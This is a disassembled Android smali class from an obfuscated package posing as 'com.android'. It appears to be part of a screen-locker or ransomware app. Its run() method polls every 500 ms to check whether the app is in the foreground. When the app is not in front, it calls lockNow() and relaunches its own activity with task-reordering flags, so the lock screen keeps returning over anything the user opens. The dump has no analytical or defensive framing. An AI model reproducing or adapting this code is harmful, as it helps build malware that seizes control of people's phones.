.class Lcom/android/x5a807058/ap;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/android/x5a807058/ZActivity;


# direct methods
.method constructor <init>(Lcom/android/x5a807058/ZActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/android/x5a807058/ap;->a:Lcom/android/x5a807058/ZActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    const/4 v4, 0x0

    const/4 v1, 0x0

    const/4 v2, 0x1

    invoke-static {v4}, Lcom/android/x5a807058/bb;->a(Landroid/content/Context;)Lcom/android/x5a807058/bb;

    move-result-object v5

    :try_start_0
    invoke-virtual {v5}, Lcom/android/x5a807058/bb;->getContext()Landroid/content/Context;

    move-result-object v6

    const-string v0, "activity"

    invoke-virtual {v6, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :goto_0
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningAppProcessInfo;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    iget-object v8, v0, Landroid/app/ActivityManager$RunningAppProcessInfo;->pkgList:[Ljava/lang/String;

    const/4 v9, 0x0

    aget-object v8, v8, v9

    const/16 v9, 0x1000

    invoke-virtual {v3, v8, v9}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v3

    :goto_1
    if-eqz v3, :cond_3

    :try_start_2
    iget-object v3, v3, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    iget v0, v0, Landroid/app/ActivityManager$RunningAppProcessInfo;->importance:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    const/16 v3, 0x64

    if-ne v0, v3, :cond_3

    move v0, v1

    :goto_2
    move v2, v0

    goto :goto_0

    :catch_0
    move-exception v3

    move-object v3, v4

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    iget-object v0, p0, Lcom/android/x5a807058/ap;->a:Lcom/android/x5a807058/ZActivity;

    invoke-static {v0}, Lcom/android/x5a807058/ZActivity;->b(Lcom/android/x5a807058/ZActivity;)Lcom/android/zics/ZModuleInterface;

    move-result-object v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/android/x5a807058/ap;->a:Lcom/android/x5a807058/ZActivity;

    invoke-static {v0}, Lcom/android/x5a807058/ZActivity;->b(Lcom/android/x5a807058/ZActivity;)Lcom/android/zics/ZModuleInterface;

    move-result-object v0

    invoke-interface {v0}, Lcom/android/zics/ZModuleInterface;->getHash()I

    move-result v0

    invoke-virtual {v5, v0}, Lcom/android/x5a807058/bb;->getModuleState(I)Z

    move-result v0

    if-eqz v0, :cond_1

    if-eqz v2, :cond_1

    invoke-virtual {v5}, Lcom/android/x5a807058/bb;->lockNow()V

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {v5}, Lcom/android/x5a807058/bb;->getContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/android/x5a807058/ZActivity;

    invoke-direct {v0, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x30200000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v2, "mhash"

    iget-object v3, p0, Lcom/android/x5a807058/ap;->a:Lcom/android/x5a807058/ZActivity;

    invoke-static {v3}, Lcom/android/x5a807058/ZActivity;->b(Lcom/android/x5a807058/ZActivity;)Lcom/android/zics/ZModuleInterface;

    move-result-object v3

    invoke-interface {v3}, Lcom/android/zics/ZModuleInterface;->getHash()I

    move-result v3

    invoke-virtual {v0, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v5}, Lcom/android/x5a807058/bb;->getContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    iget-object v0, p0, Lcom/android/x5a807058/ap;->a:Lcom/android/x5a807058/ZActivity;

    invoke-static {v0}, Lcom/android/x5a807058/ZActivity;->a(Lcom/android/x5a807058/ZActivity;)Lcom/android/zics/ZRuntimeInterface;

    move-result-object v0

    const-string v2, "aib"

    invoke-interface {v0, v2, v1}, Lcom/android/zics/ZRuntimeInterface;->saveBoolean(Ljava/lang/String;Z)V

    :cond_1
    invoke-static {}, Lcom/android/x5a807058/ZActivity;->e()Landroid/os/Handler;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-static {}, Lcom/android/x5a807058/ZActivity;->e()Landroid/os/Handler;

    move-result-object v0

    const-wide/16 v1, 0x1f4

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_2
    return-void

    :cond_3
    move v0, v2

    goto :goto_2
.end method
